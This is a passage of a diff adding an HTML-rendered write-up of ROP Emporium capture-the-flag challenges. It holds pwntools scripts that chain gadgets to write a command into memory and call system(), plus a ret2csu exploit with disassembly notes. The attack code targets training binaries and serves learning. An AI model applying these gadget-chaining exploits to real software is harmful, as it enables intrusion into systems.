+<span class="c1">#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
+</span>    <span class="n">buff</span><span class="o">+=</span> <span class="n">xor_11_12</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span>  <span class="n">buff</span>
+
+<span class="k">def</span> <span class="nf">setR10</span><span class="p">(</span><span class="n">value10</span><span class="p">,</span><span class="n">r15</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+<span class="c1"># 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
+</span>    <span class="n">xchg_11_10</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400840</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">setR11</span><span class="p">(</span><span class="n">value10</span><span class="p">)</span><span class="o">+</span><span class="n">xchg_11_10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">WriteMem</span><span class="p">(</span><span class="n">valueWM</span><span class="p">,</span><span class="n">Where</span><span class="p">):</span>
+<span class="c1"># 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
+</span>    <span class="n">mov_11_PTR10</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40084e</span><span class="p">)</span>
+    <span class="c1"># Setup r10 and r11
+</span>    <span class="n">buff</span> <span class="o">=</span> <span class="n">setR10</span><span class="p">(</span><span class="n">Where</span><span class="p">)</span>
+    <span class="n">buff</span><span class="o">+=</span> <span class="n">setR11</span><span class="p">(</span><span class="n">valueWM</span><span class="p">)</span>
+    <span class="c1"># Write into memory
+</span>    <span class="n">buff</span><span class="o">+=</span> <span class="n">mov_11_PTR10</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buff</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span><span class="o">=</span><span class="mi">40</span><span class="o">*</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">bss</span><span class="o">=</span> <span class="p">(</span><span class="mh">0x601060</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">padding</span><span class="o">+</span><span class="n">WriteMem</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">bss</span><span class="p">)</span>
+<span class="c1">#0x00000000004008c3: pop rdi; ret;
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4008c3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
+<span class="n">system</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4005e0</span><span class="p">)</span>  
+
+<span class="n">payload</span><span class="o">+=</span><span class="n">system</span>
+<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span><span class="s">'wb'</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="c1">#
+</span>  <span class="c1">#[20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
+</span>       <span class="c1">#0000000000000008  0000000000000000  WA       0     0     8
+</span>  <span class="c1">#[21] .jcr              PROGBITS         0000000000600e20  00000e20
+</span>       <span class="c1">#0000000000000008  0000000000000000  WA       0     0     8
+</span>  <span class="c1">#[22] .dynamic          DYNAMIC          0000000000600e28  00000e28
+</span>       <span class="c1">#00000000000001d0  0000000000000010  WA       6     0     8
+</span>  <span class="c1">#[23] .got              PROGBITS         0000000000600ff8  00000ff8
+</span>       <span class="c1">#0000000000000008  0000000000000008  WA       0     0     8
+</span>  <span class="c1">#[24] .got.plt          PROGBITS         0000000000601000  00001000
+</span>       <span class="c1">#0000000000000050  0000000000000008  WA       0     0     8
+</span>  <span class="c1">#[25] .data             PROGBITS         0000000000601050  00001050
+</span>       <span class="c1">#0000000000000010  0000000000000000  WA       0     0     8
+</span>  <span class="c1">#[26] .bss              NOBITS           0000000000601060  00001060
+</span>       <span class="c1">#0000000000000030  0000000000000000  WA       0     0     32
+#
+</span>
+</code></pre></div></div>
+
+<h1 id="pivot">pivot</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<h1 id="ret2csu">ret2csu</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'/root/ropemporium/ret2csu/ret2csu'</span>
+
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+finish
+finish
+finish
+finish
+finish
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#0x000000000040089c: pop r12; pop r13; pop r14; pop r15; ret;
+</span><span class="n">pop_12_13_14_15</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40089c</span><span class="p">)</span>
+<span class="n">ret</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600e48</span><span class="p">)</span>
+<span class="n">ret2win</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4007b1</span><span class="p">)</span>
+
+
+
+<span class="n">mov_rdx_rax</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400818</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">libc_csu_rdx</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400880</span><span class="p">)</span>
+
+<span class="n">rbp</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">rbp</span>
+<span class="c1"># Setup r12 = ret
+</span><span class="n">_fini</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4008B4</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">pop_12_13_14_15</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadcafebabebeef</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">libc_csu_rdx</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">ret2win</span>
+
+<span class="c1">#payload+
+#payload+
+#gdb.attach(io,gdbscript=gdbscript)
+</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="c1"># libc csu
+#
+</span>   <span class="c1">#0x0000000000400880 &lt;+64&gt;:    mov    rdx,r15  
+</span>   <span class="c1">#0x0000000000400883 &lt;+67&gt;:    mov    rsi,r14
+</span>   <span class="c1">#0x0000000000400886 &lt;+70&gt;:    mov    edi,r13d
+</span>   <span class="c1">#0x0000000000400889 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8] # r12 + rbx *8 == mem ==&gt; ret //rbx=0
+</span>   <span class="c1">#0x000000000040088d &lt;+77&gt;:    add    rbx,0x1
+</span>   <span class="c1">#0x0000000000400891 &lt;+81&gt;:    cmp    rbp,rbx # rbp = rbx+1 
+</span>   <span class="c1">#0x0000000000400894 &lt;+84&gt;:    jne    0x400880 &lt;__libc_csu_init+64&gt;
+</span>   <span class="c1">#0x0000000000400896 &lt;+86&gt;:    add    rsp,0x8
+</span>   <span class="c1">#0x000000000040089a &lt;+90&gt;:    pop    rbx
+</span>   <span class="c1">#0x000000000040089b &lt;+91&gt;:    pop    rbp
+</span>   <span class="c1">#0x000000000040089c &lt;+92&gt;:    pop    r12
+</span>   <span class="c1">#0x000000000040089e &lt;+94&gt;:    pop    r13
+</span>   <span class="c1">#0x00000000004008a0 &lt;+96&gt;:    pop    r14
+</span>   <span class="c1">#0x00000000004008a2 &lt;+98&gt;:    pop    r15
+</span>   <span class="c1">#0x00000000004008a4 &lt;+100&gt;:   ret  
+</span>
+
+   <span class="c1">#0x00000000004007b1 &lt;+0&gt;:     push   rbp
+</span>   <span class="c1">#0x00000000004007b2 &lt;+1&gt;:     mov    rbp,rsp
+</span>   <span class="c1">#0x00000000004007b5 &lt;+4&gt;:     sub    rsp,0x30
+</span>   <span class="c1">#0x00000000004007b9 &lt;+8&gt;:     mov    DWORD PTR [rbp-0x24],edi
+</span>   <span class="c1">#0x00000000004007bc &lt;+11&gt;:    mov    DWORD PTR [rbp-0x28],esi
+</span>   <span class="c1">#0x00000000004007bf &lt;+14&gt;:    mov    QWORD PTR [rbp-0x30],rdx
+</span>   <span class="c1">#0x00000000004007c3 &lt;+18&gt;:    mov    rax,QWORD PTR [rip+0x15e]        # 0x400928
+</span>   <span class="c1">#0x00000000004007ca &lt;+25&gt;:    mov    rdx,QWORD PTR [rip+0x15f]        # 0x400930
+</span>   <span class="c1">#0x00000000004007d1 &lt;+32&gt;:    mov    QWORD PTR [rbp-0x20],rax
+</span>   <span class="c1">#0x00000000004007d5 &lt;+36&gt;:    mov    QWORD PTR [rbp-0x18],rdx
+</span>   <span class="c1">#0x00000000004007d9 &lt;+40&gt;:    movzx  eax,WORD PTR [rip+0x158]        # 0x400938
+</span>   <span class="c1">#0x00000000004007e0 &lt;+47&gt;:    mov    WORD PTR [rbp-0x10],ax
+</span>   <span class="c1">#0x00000000004007e4 &lt;+51&gt;:    lea    rax,[rbp-0x20]
+</span>   <span class="c1">#0x00000000004007e8 &lt;+55&gt;:    mov    QWORD PTR [rbp-0x8],rax
+</span>   <span class="c1">#0x00000000004007ec &lt;+59&gt;:    mov    rax,QWORD PTR [rbp-0x8]
+</span>   <span class="c1">#0x00000000004007f0 &lt;+63&gt;:    mov    rax,QWORD PTR [rax]
+</span>   <span class="c1">#0x00000000004007f3 &lt;+66&gt;:    xor    rax,QWORD PTR [rbp-0x30]
+</span>   <span class="c1">#0x00000000004007f7 &lt;+70&gt;:    mov    rdx,rax
+</span>   <span class="c1">#0x00000000004007fa &lt;+73&gt;:    mov    rax,QWORD PTR [rbp-0x8]
+</span>   <span class="c1">#0x00000000004007fe &lt;+77&gt;:    mov    QWORD PTR [rax],rdx
+</span>   <span class="c1">#0x0000000000400801 &lt;+80&gt;:    lea    rax,[rbp-0x20]
+</span>   <span class="c1">#0x0000000000400805 &lt;+84&gt;:    add    rax,0x9
+</span>   <span class="c1">#0x0000000000400809 &lt;+88&gt;:    mov    QWORD PTR [rbp-0x8],rax
+</span>   <span class="c1">#0x000000000040080d &lt;+92&gt;:    mov    rax,QWORD PTR [rbp-0x8]
+</span>   <span class="c1">#0x0000000000400811 &lt;+96&gt;:    mov    rax,QWORD PTR [rax]
+</span>   <span class="c1">#0x0000000000400814 &lt;+99&gt;:    xor    rax,QWORD PTR [rbp-0x30]     0x30var must be xor of 0xdeadcafebebeef
+</span>   <span class="c1">#0x0000000000400818 &lt;+103&gt;:   mov    rdx,rax                     rax must be 0xdeadcaf
+</span>   <span class="c1">#0x000000000040081b &lt;+106&gt;:   mov    rax,QWORD PTR [rbp-0x8]
+</span>   <span class="c1">#0x000000000040081f &lt;+110&gt;:   mov    QWORD PTR [rax],rdx
+</span>   <span class="c1">#0x0000000000400822 &lt;+113&gt;:   lea    rax,[rbp-0x20]
+</span>   <span class="c1">#0x0000000000400826 &lt;+117&gt;:   mov    rdi,rax
+</span>   <span class="c1">#0x0000000000400829 &lt;+120&gt;:   call   0x4005a0 &lt;system@plt&gt; (rdx) must be 0xdeadcafebabebeef
+</span>   <span class="c1">#0x000000000040082e &lt;+125&gt;:   nop
+</span>   <span class="c1">#0x000000000040082f &lt;+126&gt;:   leave
+</span>   <span class="c1">#0x0000000000400830 &lt;+127&gt;:   ret
+#
+</span>   <span class="c1">#gef➤  x/10i 0x4008b4
+</span>   <span class="c1">#0x4008b4 &lt;_fini&gt;:    sub    rsp,0x8
+</span>   <span class="c1">#0x4008b8 &lt;_fini+4&gt;:  add    rsp,0x8
+</span>   <span class="c1">#0x4008bc &lt;_fini+8&gt;:  ret
+</span>   <span class="c1">#0x4008bd:    Cannot access memory at address 0x4008bd
+#gef➤  x/100x &amp;_DYNAMIC
+#0x600e20:       0x00000001      0x00000000      0x00000001      0x00000000
+#0x600e30:       0x0000000c      0x00000000      0x00400560      0x00000000
+#0x600e40:       0x0000000d      0x00000000      0x004008b4      0x00000000
+#
+</span></code></pre></div></div>
+:ET
